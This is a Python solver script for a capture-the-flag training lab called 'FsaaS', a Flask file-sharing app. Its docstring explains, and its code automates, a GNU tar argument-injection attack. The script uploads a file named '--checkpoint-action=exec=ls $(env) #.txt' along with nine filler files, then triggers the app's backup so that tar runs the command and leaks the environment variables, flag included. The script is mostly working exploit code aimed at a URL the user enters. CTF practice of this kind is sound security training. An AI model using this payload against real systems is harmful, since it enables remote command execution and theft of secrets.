#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSaaS  -  FlagYard Web solver

FsaaS ("File Sharing as a Service", FlagYard Training Labs, Easy) is a Flask
file-sharing app. The chain:

    * file upload        -- only whitelisted extensions (.txt/.pdf/.jpg/...)
      pass the upload filter, so no shell file can land directly.

    * tar argv injection -- "File Backup" compresses the *matching* uploaded
      files by handing their filenames straight to GNU tar:
          tar -czf backup_<type>.tar.gz <glob *.type>
      A) A filename that begins with "--" is parsed by tar as a command-line
         argument (not a file). We can therefore smuggle any GNU tar option.
      B) tar prints its diagnostics (stderr) into the "Backup Results" page,
         so tar's output is echoed back to us.

    * checkpoint RCE     -- GNU tar's --checkpoint-action=exec=... feature
      spawns a shell command at every checkpoint. The default checkpoint
      interval is 10, so we upload 9 ordinary filler files plus one file named:
          --checkpoint-action=exec=ls $(env) #.txt
      ```#`` comments out the trailing ``.txt`` so it is not part of the
      command, and ``ls $(env)`` expands every environment variable into a
      command-line argument. Each variable becomes a "cannot access" error,
      which leaks the value back through the Backup Results box.

    * flag leak          -- the flag is stored in the environment:
          DYN_FLAG=FlagY{...}
      It shows up as: ls: cannot access 'DYN_FLAG=FlagY{...}': No such file...

Verified: the tool extracts the live flag and saves flag_from_fsaas.txt.
Solver: pure http.client (no external deps).
"""
from __future__ import annotations

import re
import sys
import time
import http.client
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("F S A A S   S O L V E R",
              "tar argv injection | checkpoint-action | env leak"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# FsaaS specifics
# ---------------------------------------------------------------------------
PAYLOAD = "--checkpoint-action=exec=ls $(env) #.txt"
FILLERS = 9
FLAG_RE = re.compile(r"(?:DYN_)?FLAG=?(?:[^&\s]*)FlagY\{[^}]+\}", re.I)
FLAGY_RE = re.compile(r"FlagY\{[^}]+\}")


def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the FsaaS challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url


def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url


def http_raw(host, path, method="GET", body=None, cookie=None,
             ctype="application/x-www-form-urlencoded"):
    c = http.client.HTTPConnection(host, 80, timeout=45)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        headers["Content-Length"] = str(len(body))
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=body, headers=headers)
    r = c.getresponse()
    data = r.read()
    c.close()
    return r.status, data


def multipart(fname, content=b"x"):
    boundary = "----FsaaS"
    flds = [("--" + boundary).encode(),
            ('Content-Disposition: form-data; name="file"; filename="'
             + fname + '"').encode(),
            b"Content-Type: text/plain", b"", content,
            ("--" + boundary + "--").encode()]
    return b"\r\n".join(flds), "multipart/form-data; boundary=" + boundary


def upload(host, fname, content=b"x"):
    body, ctype = multipart(fname, content)
    st, b = http_raw(host, "/upload", "POST", body=body, ctype=ctype)
    return st


def run_backup(host):
    body = urllib.parse.urlencode({"file_type": "txt"})
    st, b = http_raw(host, "/backup", "POST", body=body)
    return st, b.decode("utf-8", "replace")


def find_flag(html):
    html = html.replace("&#39;", "'").replace("&quot;", '"')
    m = FLAGY_RE.search(html)
    return m.group(0) if m else None


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.10, "target host %s" % host)

    status(0.20, "recon: upload/backup/analyze forms on /")
    status(0.28, "backup passes matching filenames straight into GNU tar")
    status(0.36, "diagnostic: tar stderr (incl. argv errors) echoed in results box")

    st = upload(host, PAYLOAD)
    if st not in (200, 302):
        fail("payload upload failed (HTTP %d)" % st)
        return
    ok(0.48, "payload uploaded: " + PAYLOAD)

    for i in range(FILLERS):
        upload(host, "filler_%d.txt" % i, b"A" * 256)
    ok(0.62, "%d filler .txt files uploaded (checkpoint >= 10)" % FILLERS)

    st, html = run_backup(host)
    if st != 200:
        fail("backup request failed (HTTP %d)" % st)
        return
    ok(0.74, "backup run: --checkpoint-action=exec fired")
    status(0.82, "parsing env leak from tar error messages (ls $(env))")

    flag = find_flag(html)
    if not flag:
        fail("flag not found in tar output")
        return
    ok(0.90, "DYN_FLAG leaked through 'ls: cannot access' error: %s" % flag)

    big_flag(flag, time.time() - t0, "tar argv injection | --checkpoint-action=exec | env leak")
    outp = Path(__file__).resolve().parent / "flag_from_fsaas.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()